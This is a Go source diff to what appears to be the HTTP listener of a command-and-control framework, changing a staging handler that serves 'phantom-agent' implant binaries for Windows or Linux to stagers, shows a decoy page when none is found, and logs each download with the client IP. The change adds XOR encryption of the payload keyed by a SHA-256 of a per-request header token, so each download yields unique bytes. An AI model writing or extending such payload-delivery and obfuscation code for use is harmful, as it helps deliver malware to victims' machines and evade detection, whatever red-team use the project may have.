@@ -3,6 +3,8 @@ package listener
 import (
 	"context"
 	"crypto/rsa"
+	"crypto/sha256"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"net"
@@ -339,7 +341,7 @@ func (l *HTTPListener) handleStaging(w http.ResponseWriter, r *http.Request) {
 		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
 	}
 
-	data, err := os.ReadFile(agentPath)
+	agentBinary, err := os.ReadFile(agentPath)
 	if err != nil {
 		// Try the other OS as fallback
 		if strings.Contains(agentPath, "windows") {
@@ -347,16 +349,33 @@ func (l *HTTPListener) handleStaging(w http.ResponseWriter, r *http.Request) {
 		} else {
 			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
 		}
-		data, err = os.ReadFile(agentPath)
+		agentBinary, err = os.ReadFile(agentPath)
 		if err != nil {
 			l.serveDecoy(w, r)
 			return
 		}
 	}
 
+	// Per-request key derivation: if the stager sent a challenge token,
+	// XOR-encrypt the binary using SHA-256(challenge) as the key.
+	// This prevents replay attacks — each download produces unique bytes.
+	// Stagers without the token receive plaintext (backward compatibility).
+	token := r.Header.Get("X-Client-Token")
+	if len(token) == 32 {
+		challengeBytes, decErr := hex.DecodeString(token)
+		if decErr == nil {
+			derived := sha256.Sum256(challengeBytes)
+			xored := make([]byte, len(agentBinary))
+			for i, b := range agentBinary {
+				xored[i] = b ^ derived[i%32]
+			}
+			agentBinary = xored
+		}
+	}
+
 	w.Header().Set("Content-Type", "application/octet-stream")
-	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
-	w.Write(data)
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(agentBinary)))
+	w.Write(agentBinary)
 	l.emitEvent("staging_download", extractIP(r), filepath.Base(agentPath))
 }
 
